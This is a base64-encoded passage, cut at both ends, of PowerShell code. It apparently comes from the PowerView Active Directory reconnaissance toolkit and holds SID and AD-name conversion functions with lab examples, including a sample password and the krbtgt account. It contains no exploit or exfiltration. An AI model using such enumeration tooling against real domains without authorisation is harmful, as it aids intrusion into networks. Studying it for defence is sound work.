ICAgICBbU3RyaW5nW11dCiAgICAgICAgJE9iamVjdE5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRPYmplY3QgaW4gJE9iamVjdE5hbWUpIHsKICAgICAgICAgICAgJE9iamVjdCA9ICRPYmplY3QgLVJlcGxhY2UgJy8nLCdcJwoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAkRE4gPSBDb252ZXJ0LUFETmFtZSAtSWRlbnRpdHkgJE9iamVjdCAtT3V0cHV0VHlwZSAnRE4nIEBEb21haW5TZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgaWYgKCRETikgewogICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJEROLlN1YlN0cmluZygkRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkRE4uU3BsaXQoJywnKVswXS5zcGxpdCgnPScpWzFdCgogICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJ29iamVjdHNpZCcKICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluT2JqZWN0IEBEb21haW5TZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBvYmplY3RzaWQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRPYmplY3QuQ29udGFpbnMoJ1wnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluID0gJE9iamVjdC5TcGxpdCgnXCcpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSAkT2JqZWN0LlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW4gPSAoR2V0LURvbWFpbiBARG9tYWluU2VhcmNoZXJBcmd1bWVudHMpLk5hbWUKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRPYmogPSAoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLk5UQWNjb3VudCgkRG9tYWluLCAkT2JqZWN0KSkKICAgICAgICAgICAgICAgICAgICAkT2JqLlRyYW5zbGF0ZShbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdKS5WYWx1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0VG8tU0lEXSBFcnJvciBjb252ZXJ0aW5nICREb21haW5cJE9iamVjdCA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gQ29udmVydEZyb20tU0lEIHsKPCMKLlNZTk9QU0lTCgpDb252ZXJ0cyBhIHNlY3VyaXR5IGlkZW50aWZpZXIgKFNJRCkgdG8gYSBncm91cC91c2VyIG5hbWUuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IENvbnZlcnQtQUROYW1lICAKCi5ERVNDUklQVElPTgoKQ29udmVydHMgYSBzZWN1cml0eSBpZGVudGlmaWVyIHN0cmluZyAoU0lEKSB0byBhIGdyb3VwL3VzZXIgbmFtZQp1c2luZyBDb252ZXJ0LUFETmFtZS4KCi5QQVJBTUVURVIgT2JqZWN0U2lkCgpTcGVjaWZpZXMgb25lIG9yIG1vcmUgU0lEcyB0byBjb252ZXJ0LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHRyYW5zbGF0aW9uLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0byBmb3IgdGhlIHRyYW5zbGF0aW9uLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpTcGVjaWZpZXMgYW4gYWx0ZXJuYXRlIGNyZWRlbnRpYWwgdG8gdXNlIGZvciB0aGUgdHJhbnNsYXRpb24uCgouRVhBTVBMRQoKQ29udmVydEZyb20tU0lEIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOAoKVEVTVExBQlxoYXJtajB5CgouRVhBTVBMRQoKIlMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwNyIsICJTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgiLCAiUy0xLTUtMzItNTYyIiB8IENvbnZlcnRGcm9tLVNJRAoKVEVTVExBQlxXSU5ET1dTMiQKVEVTVExBQlxoYXJtajB5CkJVSUxUSU5cRGlzdHJpYnV0ZWQgQ09NIFVzZXJzCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0nLCAkU2VjUGFzc3dvcmQpCkNvbnZlcnRGcm9tLVNJRCBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDggLUNyZWRlbnRpYWwgJENyZWQKClRFU1RMQUJcaGFybWoweQoKLklOUFVUUwoKU3RyaW5nCgpBY2NlcHRzIG9uZSBvciBtb3JlIFNJRCBzdHJpbmdzIG9uIHRoZSBwaXBlbGluZS4KCi5PVVRQVVRTCgpTdHJpbmcKClRoZSBjb252ZXJ0ZWQgRE9NQUlOXHVzZXJuYW1lLgojPgoKICAgIFtPdXRwdXRUeXBlKFtTdHJpbmddKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnU0lEJyldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignXlMtMS0uKicpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkT2JqZWN0U2lkLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQUROYW1lQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQUROYW1lQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQUROYW1lQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJFRhcmdldFNpZCBpbiAkT2JqZWN0U2lkKSB7CiAgICAgICAgICAgICRUYXJnZXRTaWQgPSAkVGFyZ2V0U2lkLnRyaW0oJyonKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgIyB0cnkgdG8gcmVzb2x2ZSBhbnkgYnVpbHQtaW4gU0lEcyBmaXJzdCAtIGh0dHBzOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2VuLXVzL2tiLzI0MzMzMAogICAgICAgICAgICAgICAgU3dpdGNoICgkVGFyZ2V0U2lkKSB7CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0wJyAgICAgICAgIHsgJ051bGwgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0wLTAnICAgICAgIHsgJ05vYm9keScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMScgICAgICAgICB7ICdXb3JsZCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTEtMCcgICAgICAgeyAnRXZlcnlvbmUnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTInICAgICAgICAgeyAnTG9jYWwgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0yLTAnICAgICAgIHsgJ0xvY2FsJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0yLTEnICAgICAgIHsgJ0NvbnNvbGUgTG9nb24gJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zJyAgICAgICAgIHsgJ0NyZWF0b3IgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zLTAnICAgICAgIHsgJ0NyZWF0b3IgT3duZXInIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtMScgICAgICAgeyAnQ3JlYXRvciBHcm91cCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMy0yJyAgICAgICB7ICdDcmVhdG9yIE93bmVyIFNlcnZlcicgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMy0zJyAgICAgICB7ICdDcmVhdG9yIEdyb3VwIFNlcnZlcicgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMy00JyAgICAgICB7ICdPd25lciBSaWdodHMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTQnICAgICAgICAgeyAnTm9uLXVuaXF1ZSBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUnICAgICAgICAgeyAnTlQgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTEnICAgICAgIHsgJ0RpYWx1cCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0yJyAgICAgICB7ICdOZXR3b3JrJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMnICAgICAgIHsgJ0JhdGNoJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTQnICAgICAgIHsgJ0ludGVyYWN0aXZlJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTYnICAgICAgIHsgJ1NlcnZpY2UnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtNycgICAgICAgeyAnQW5vbnltb3VzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTgnICAgICAgIHsgJ1Byb3h5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTknICAgICAgIHsgJ0VudGVycHJpc2UgRG9tYWluIENvbnRyb2xsZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTEwJyAgICAgIHsgJ1ByaW5jaXBhbCBTZWxmJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTExJyAgICAgIHsgJ0F1dGhlbnRpY2F0ZWQgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTInICAgICAgeyAnUmVzdHJpY3RlZCBDb2RlJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTEzJyAgICAgIHsgJ1Rlcm1pbmFsIFNlcnZlciBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xNCcgICAgICB7ICdSZW1vdGUgSW50ZXJhY3RpdmUgTG9nb24nIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTUnICAgICAgeyAnVGhpcyBPcmdhbml6YXRpb24gJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE3JyAgICAgIHsgJ1RoaXMgT3JnYW5pemF0aW9uICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xOCcgICAgICB7ICdMb2NhbCBTeXN0ZW0nIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTknICAgICAgeyAnTlQgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTIwJyAgICAgIHsgJ05UIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS04MC0wJyAgICB7ICdBbGwgU2VydmljZXMgJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NCcgIHsgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ1JyAgeyAnQlVJTFRJTlxVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDYnICB7ICdCVUlMVElOXEd1ZXN0cycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDcnICB7ICdCVUlMVElOXFBvd2VyIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0OCcgIHsgJ0JVSUxUSU5cQWNjb3VudCBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ5JyAgeyAnQlVJTFRJTlxTZXJ2ZXIgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1MCcgIHsgJ0JVSUxUSU5cUHJpbnQgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1MScgIHsgJ0JVSUxUSU5cQmFja3VwIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTInICB7ICdCVUlMVElOXFJlcGxpY2F0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1NCcgIHsgJ0JVSUxUSU5cUHJlLVdpbmRvd3MgMjAwMCBDb21wYXRpYmxlIEFjY2VzcycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTUnICB7ICdCVUlMVElOXFJlbW90ZSBEZXNrdG9wIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1NicgIHsgJ0JVSUxUSU5cTmV0d29yayBDb25maWd1cmF0aW9uIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTcnICB7ICdCVUlMVElOXEluY29taW5nIEZvcmVzdCBUcnVzdCBCdWlsZGVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTgnICB7ICdCVUlMVElOXFBlcmZvcm1hbmNlIE1vbml0b3IgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU5JyAgeyAnQlVJTFRJTlxQZXJmb3JtYW5jZSBMb2cgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTYwJyAgeyAnQlVJTFRJTlxXaW5kb3dzIEF1dGhvcml6YXRpb24gQWNjZXNzIEdyb3VwJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU2MScgIHsgJ0JVSUxUSU5cVGVybWluYWwgU2VydmVyIExpY2Vuc2UgU2VydmVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjInICB7ICdCVUlMVElOXERpc3RyaWJ1dGVkIENPTSBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjknICB7ICdCVUlMVElOXENyeXB0b2dyYXBoaWMgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3MycgIHsgJ0JVSUxUSU5cRXZlbnQgTG9nIFJlYWRlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc0JyAgeyAnQlVJTFRJTlxDZXJ0aWZpY2F0ZSBTZXJ2aWNlIERDT00gQWNjZXNzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3NScgIHsgJ0JVSUxUSU5cUkRTIFJlbW90ZSBBY2Nlc3MgU2VydmVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzYnICB7ICdCVUlMVElOXFJEUyBFbmRwb2ludCBTZXJ2ZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3NycgIHsgJ0JVSUxUSU5cUkRTIE1hbmFnZW1lbnQgU2VydmVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzgnICB7ICdCVUlMVElOXEh5cGVyLVYgQWRtaW5pc3RyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc5JyAgeyAnQlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01ODAnICB7ICdCVUlMVElOXEFjY2VzcyBDb250cm9sIEFzc2lzdGFuY2UgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgRGVmYXVsdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbnZlcnQtQUROYW1lIC1JZGVudGl0eSAkVGFyZ2V0U2lkIEBBRE5hbWVBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0NvbnZlcnRGcm9tLVNJRF0gRXJyb3IgY29udmVydGluZyBTSUQgJyRUYXJnZXRTaWQnIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBDb252ZXJ0LUFETmFtZSB7CjwjCi5TWU5PUFNJUwoKQ29udmVydHMgQWN0aXZlIERpcmVjdG9yeSBvYmplY3QgbmFtZXMgYmV0d2VlbiBhIHZhcmlldHkgb2YgZm9ybWF0cy4KCkF1dGhvcjogQmlsbCBTdGV3YXJ0LCBQYXNxdWFsZSBMYW50ZWxsYSAgCk1vZGlmaWNhdGlvbnM6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIGlzIGhlYXZpbHkgYmFzZWQgb24gQmlsbCBTdGV3YXJ0J3MgY29kZSBhbmQgUGFzcXVhbGUgTGFudGVsbGEncyBjb2RlIChpbiBMSU5LKQphbmQgdHJhbnNsYXRlcyBBY3RpdmUgRGlyZWN0b3J5IG5hbWVzIGJldHdlZW4gdmFyaW91cyBmb3JtYXRzIHVzaW5nIHRoZSBOYW1lVHJhbnNsYXRlIENPTSBvYmplY3QuCgouUEFSQU1FVEVSIElkZW50aXR5CgpTcGVjaWZpZXMgdGhlIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0IG5hbWUgdG8gdHJhbnNsYXRlLCBvZiB0aGUgZm9sbG93aW5nIGZvcm06CgogICAgRE4gICAgICAgICAgICAgICAgc2hvcnQgZm9yICdkaXN0aW5ndWlzaGVkIG5hbWUnOyBlLmcuLCAnQ049UGhpbmVhcyBGbHlubixPVT1FbmdpbmVlcnMsREM9ZmFicmlrYW0sREM9Y29tJwogICAgQ2Fub25pY2FsICAgICAgICAgY2Fub25pY2FsIG5hbWU7IGUuZy4sICdmYWJyaWthbS5jb20vRW5naW5lZXJzL1BoaW5lYXMgRmx5bm4nCiAgICBOVDQgICAgICAgICAgICAgICBkb21haW5cdXNlcm5hbWU7IGUuZy4sICdmYWJyaWthbVxwZmx5bm4nCiAgICBEaXNwbGF5ICAgICAgICAgICBkaXNwbGF5IG5hbWUsIGUuZy4gJ3BmbHlubicKICAgIERvbWFpblNpbXBsZSAgICAgIHNpbXBsZSBkb21haW4gbmFtZSBmb3JtYXQsIGUuZy4gJ3BmbHlubkBmYWJyaWthbS5jb20nCiAgICBFbnRlcnByaXNlU2ltcGxlICBzaW1wbGUgZW50ZXJwcmlzZSBuYW1lIGZvcm1hdCwgZS5nLiAncGZseW5uQGZhYnJpa2FtLmNvbScKICAgIEdVSUQgICAgICAgICAgICAgIEdVSUQ7IGUuZy4sICd7OTVlZTlmZmYtMzQzNi0xMWQxLWIyYjAtZDE1YWUzYWM4NDM2fScKICAgIFVQTiAgICAgICAgICAgICAgIHVzZXIgcHJpbmNpcGFsIG5hbWU7IGUuZy4sICdwZmx5bm5AZmFicmlrYW0uY29tJwogICAgQ2Fub25pY2FsRXggICAgICAgZXh0ZW5kZWQgY2Fub25pY2FsIG5hbWUgZm9ybWF0CiAgICBTUE4gICAgICAgICAgICAgICBzZXJ2aWNlIHByaW5jaXBhbCBuYW1lIGZvcm1hdDsgZS5nLiAnSFRUUC9rYWlyb21hYy5jb250b3NvLmNvbScKICAgIFNJRCAgICAgICAgICAgICAgIFNlY3VyaXR5IElkZW50aWZpZXI7IGUuZy4sICdTLTEtNS0yMS0xMjk4NjIzMS02MDA2NDE1NDctNzA5MTIyMjg4LTU3OTk5JwoKLlBBUkFNRVRFUiBPdXRwdXRUeXBlCgpTcGVjaWZpZXMgdGhlIG91dHB1dCBuYW1lIHR5cGUgeW91IHdhbnQgdG8gY29udmVydCB0bywgd2hpY2ggbXVzdCBiZSBvbmUgb2YgdGhlIGZvbGxvd2luZzoKCiAgICBETiAgICAgICAgICAgICAgICBzaG9ydCBmb3IgJ2Rpc3Rpbmd1aXNoZWQgbmFtZSc7IGUuZy4sICdDTj1QaGluZWFzIEZseW5uLE9VPUVuZ2luZWVycyxEQz1mYWJyaWthbSxEQz1jb20nCiAgICBDYW5vbmljYWwgICAgICAgICBjYW5vbmljYWwgbmFtZTsgZS5nLiwgJ2ZhYnJpa2FtLmNvbS9FbmdpbmVlcnMvUGhpbmVhcyBGbHlubicKICAgIE5UNCAgICAgICAgICAgICAgIGRvbWFpblx1c2VybmFtZTsgZS5nLiwgJ2ZhYnJpa2FtXHBmbHlubicKICAgIERpc3BsYXkgICAgICAgICAgIGRpc3BsYXkgbmFtZSwgZS5nLiAncGZseW5uJwogICAgRG9tYWluU2ltcGxlICAgICAgc2ltcGxlIGRvbWFpbiBuYW1lIGZvcm1hdCwgZS5nLiAncGZseW5uQGZhYnJpa2FtLmNvbScKICAgIEVudGVycHJpc2VTaW1wbGUgIHNpbXBsZSBlbnRlcnByaXNlIG5hbWUgZm9ybWF0LCBlLmcuICdwZmx5bm5AZmFicmlrYW0uY29tJwogICAgR1VJRCAgICAgICAgICAgICAgR1VJRDsgZS5nLiwgJ3s5NWVlOWZmZi0zNDM2LTExZDEtYjJiMC1kMTVhZTNhYzg0MzZ9JwogICAgVVBOICAgICAgICAgICAgICAgdXNlciBwcmluY2lwYWwgbmFtZTsgZS5nLiwgJ3BmbHlubkBmYWJyaWthbS5jb20nCiAgICBDYW5vbmljYWxFeCAgICAgICBleHRlbmRlZCBjYW5vbmljYWwgbmFtZSBmb3JtYXQsIGUuZy4gJ2ZhYnJpa2FtLmNvbS9Vc2Vycy9QaGluZWFzIEZseW5uJwogICAgU1BOICAgICAgICAgICAgICAgc2VydmljZSBwcmluY2lwYWwgbmFtZSBmb3JtYXQ7IGUuZy4gJ0hUVFAva2Fpcm9tYWMuY29udG9zby5jb20nCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgdHJhbnNsYXRpb24sIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvIGZvciB0aGUgdHJhbnNsYXRpb24uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKClNwZWNpZmllcyBhbiBhbHRlcm5hdGUgY3JlZGVudGlhbCB0byB1c2UgZm9yIHRoZSB0cmFuc2xhdGlvbi4KCi5FWEFNUExFCgpDb252ZXJ0LUFETmFtZSAtSWRlbnRpdHkgIlRFU1RMQUJcaGFybWoweSIKCmhhcm1qMHlAdGVzdGxhYi5sb2NhbAoKLkVYQU1QTEUKCiJURVNUTEFCXGtyYnRndCIsICJDTj1BZG1pbmlzdHJhdG9yLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwiIHwgQ29udmVydC1BRE5hbWUgLU91dHB1dFR5cGUgQ2Fub25pY2FsCgp0ZXN0bGFiLmxvY2FsL1VzZXJzL2tyYnRndAp0ZXN0bGFiLmxvY2FsL1VzZXJzL0FkbWluaXN0cmF0b3IKCi5FWEFNUExFCgpDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBkbiAtSWRlbnRpdHkgJ1RFU1RMQUJcaGFybWoweScgLVNlcnZlciBQUklNQVJZLnRlc3RsYWIubG9jYWwKCkNOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtJywgJFNlY1Bhc3N3b3JkKQonUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4JyB8IENvbnZlcnQtQUROQW1lIC1DcmVkZW50aWFsICRDcmVkCgpURVNUTEFCXGhhcm1qMHkKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cy